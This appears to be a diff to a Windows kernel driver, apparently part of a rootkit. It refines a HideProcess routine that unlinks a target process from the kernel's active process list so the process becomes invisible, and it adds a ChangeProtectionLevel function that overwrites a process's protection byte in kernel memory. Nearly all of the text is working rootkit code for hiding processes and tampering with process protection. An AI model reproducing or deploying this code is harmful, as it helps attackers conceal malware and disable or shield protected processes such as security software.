@@ -12,7 +12,7 @@ NTSTATUS HideProcess(int pid) {
 
 	__try {
 
-		NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&process);
+		NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS *)&process);
 
 		if (!NT_SUCCESS(status)) {
 
@@ -31,6 +31,7 @@ NTSTATUS HideProcess(int pid) {
         KdPrint(("[+] Process is found.\n"));
         pList = (PLIST_ENTRY)((char *)process + eoffsets.ActiveProcessLinks_offset);
 
+        ExAcquirePushLockExclusive(&pLock);
 
         if (pList->Blink == nullptr || pList->Flink == nullptr) {
             ExReleasePushLockExclusive(&pLock);
@@ -51,9 +52,6 @@ NTSTATUS HideProcess(int pid) {
         ExReleasePushLockExclusive(&pLock);
 
         KdPrint(("[+] Process %wZ is hidden now!\n", PsGetProcessImageFileName((PEPROCESS)process)));
-
-
-
 	}
 
     __except (EXCEPTION_EXECUTE_HANDLER){
@@ -69,6 +67,52 @@ NTSTATUS HideProcess(int pid) {
     return STATUS_SUCCESS;
 }
 
+NTSTATUS ChangeProtectionLevel(int pid, BYTE protectionLevel) {
+
+    PVOID process;
+    NTSTATUS ret;
+    ULONG_PTR prevProtect;
+
+    if (protectionLevel == 0x0) {
+        KdPrint(("[-] Protection Level is not valid!\n"));
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS *)&process);
+
+    if (!NT_SUCCESS(ret)) {
+
+        ObDereferenceObject(process);
+
+        if (ret == STATUS_INVALID_PARAMETER) {
+            KdPrint(("[-] Process cannot be found!\n"));
+        }
+        else if (ret == STATUS_INVALID_CID) {
+            KdPrint(("[-] PID is not valid!\n")); 
+        }
+
+        return ret;
+    }
+
+    prevProtect = (ULONG_PTR)process + eoffsets.protection_offset;
+
+    if (*(BYTE *)prevProtect == protectionLevel) {
+        KdPrint(("[-] Protection Level already set.\n"));
+        return STATUS_SUCCESS;
+    }
+
+    ExAcquirePushLockExclusive(&pLock);
+
+    *(BYTE *)prevProtect = protectionLevel;
+
+    ExReleasePushLockExclusive(&pLock);
+
+    ObDereferenceObject(process);
+
+    KdPrint(("[+] Protection Level changed successfully!\n"));
+
+    return STATUS_SUCCESS;
+}
 
 NTSTATUS InializeOffsets() {
     //DWORD dwOffset = 0;
